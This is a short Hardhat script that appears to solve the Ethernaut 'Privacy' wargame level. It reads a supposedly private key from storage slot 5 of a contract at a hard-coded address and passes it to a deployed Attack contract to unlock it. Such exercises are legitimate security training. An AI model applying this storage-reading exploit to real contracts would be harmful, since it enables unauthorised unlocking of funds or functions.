import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();

    const Privacy = await helper.getContractAt("Privacy", "0x809c0E1125D12Af6aa216b117aa98e78B7dD8502");
    const Attack = await helper.deployContract("Attack");

    console.log(await Privacy.locked());

    const key = await helper.provider.getStorageAt(Privacy.address, 5);

    let tx = await Attack.attack(Privacy.address, key, {
        gasLimit: 10000000
    });
    await tx.wait();

    console.log(await Privacy.locked());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });